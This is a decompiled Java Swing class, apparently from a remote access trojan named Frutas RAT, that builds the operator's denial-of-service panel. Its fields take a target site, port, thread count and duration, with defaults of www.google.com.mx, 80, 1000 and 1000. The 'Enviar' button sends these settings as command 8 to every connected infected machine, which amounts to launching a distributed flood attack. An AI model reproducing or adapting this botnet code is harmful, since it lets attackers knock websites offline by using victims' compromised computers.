/*     */ package cliente;
/*     */ 
/*     */ import java.awt.Color;
/*     */ import java.awt.Container;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ActionListener;
/*     */ import java.util.ResourceBundle;
/*     */ import javax.swing.GroupLayout;
/*     */ import javax.swing.GroupLayout.Alignment;
/*     */ import javax.swing.GroupLayout.ParallelGroup;
/*     */ import javax.swing.GroupLayout.SequentialGroup;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JInternalFrame;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JTextField;
/*     */ import javax.swing.LayoutStyle.ComponentPlacement;
/*     */ 
/*     */ public class Doos extends JInternalFrame
/*     */   implements SoporteLenguaje
/*     */ {
/*     */   private Usuario[] user;
/*     */   private JButton jButton1;
/*     */   private JLabel jLabel1;
/*     */   private JLabel jLabel2;
/*     */   private JLabel jLabel3;
/*     */   private JLabel jLabel4;
/*     */   private JTextField jTextField1;
/*     */   private JTextField jTextField2;
/*     */   private JTextField jTextField3;
/*     */   private JTextField jTextField4;
/*     */ 
/*     */   public Doos(Usuario[] us, ResourceBundle rb)
/*     */   {
/*  19 */     initComponents();
/*  20 */     this.user = us;
/*     */ 
/*  23 */     if (this.user.length > 1)
/*  24 */       setTitle(getTitle() + "Users: " + us.length + "");
/*     */     else
/*  26 */       setTitle(getTitle() + this.user[0].getIdentificador());
/*  27 */     changeLenguage(rb);
/*     */   }
/*     */ 
/*     */   private void initComponents()
/*     */   {
/*  40 */     this.jLabel1 = new JLabel();
/*  41 */     this.jTextField1 = new JTextField();
/*  42 */     this.jLabel2 = new JLabel();
/*  43 */     this.jTextField2 = new JTextField();
/*  44 */     this.jLabel3 = new JLabel();
/*  45 */     this.jTextField3 = new JTextField();
/*  46 */     this.jLabel4 = new JLabel();
/*  47 */     this.jTextField4 = new JTextField();
/*  48 */     this.jButton1 = new JButton();
/*     */ 
/*  50 */     setBackground(new Color(255, 255, 153));
/*  51 */     setClosable(true);
/*  52 */     setIconifiable(true);
/*  53 */     setTitle("Cr.WebBot");
/*     */ 
/*  55 */     this.jLabel1.setText("Pagina: ");
/*     */ 
/*  57 */     this.jTextField1.setBackground(new Color(255, 255, 153));
/*  58 */     this.jTextField1.setText("www.google.com.mx");
/*     */ 
/*  60 */     this.jLabel2.setText("Puerto: ");
/*     */ 
/*  62 */     this.jTextField2.setBackground(new Color(255, 255, 153));
/*  63 */     this.jTextField2.setText("80");
/*     */ 
/*  65 */     this.jLabel3.setText("Hilos: ");
/*     */ 
/*  67 */     this.jTextField3.setBackground(new Color(255, 255, 153));
/*  68 */     this.jTextField3.setText("1000");
/*     */ 
/*  70 */     this.jLabel4.setText("Tiempo (s): ");
/*     */ 
/*  72 */     this.jTextField4.setBackground(new Color(255, 255, 153));
/*  73 */     this.jTextField4.setText("1000");
/*     */ 
/*  75 */     this.jButton1.setText("Enviar");
/*  76 */     this.jButton1.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/*  78 */         Doos.this.jButton1ActionPerformed(evt);
/*     */       }
/*     */     });
/*  82 */     GroupLayout layout = new GroupLayout(getContentPane());
/*  83 */     getContentPane().setLayout(layout);
/*  84 */     layout.setHorizontalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap(-1, 32767).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup().addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING, false).addGroup(layout.createSequentialGroup().addComponent(this.jLabel3).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jTextField3, -2, 74, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel4).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jTextField4)).addGroup(layout.createSequentialGroup().addComponent(this.jLabel1).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jTextField1, -2, 127, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jTextField2, -2, 31, -2))).addContainerGap()).addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup().addComponent(this.jButton1).addGap(101, 101, 101)))));
/*     */ 
/* 112 */     layout.setVerticalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.jLabel1).addComponent(this.jTextField1, -2, -1, -2).addComponent(this.jLabel2).addComponent(this.jTextField2, -2, -1, -2)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.jLabel3).addComponent(this.jTextField3, -2, -1, -2).addComponent(this.jLabel4).addComponent(this.jTextField4, -2, -1, -2)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jButton1).addContainerGap(-1, 32767)));
/*     */ 
/* 132 */     pack();
/*     */   }
/*     */ 
/*     */   private void jButton1ActionPerformed(ActionEvent evt) {
/* 136 */     String t = this.jTextField1.getText() + "#" + this.jTextField2.getText() + "#" + this.jTextField3.getText() + "#" + this.jTextField4.getText();
/*     */ 
/* 139 */     for (int i = 0; i < this.user.length; i++)
/* 140 */       this.user[i].sendComando(8, t);
/*     */   }
/*     */ 
/*     */   public void changeLenguage(ResourceBundle rb)
/*     */   {
/* 159 */     this.jLabel1.setText(rb.getString("dos.pagina"));
/* 160 */     this.jLabel2.setText(rb.getString("dos.puerto"));
/* 161 */     this.jLabel3.setText(rb.getString("dos.hilos"));
/* 162 */     this.jLabel4.setText(rb.getString("dos.tiempo"));
/* 163 */     this.jButton1.setText(rb.getString("dos.boton"));
/*     */   }
/*     */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     cliente.Doos
 * JD-Core Version:    0.6.2
 */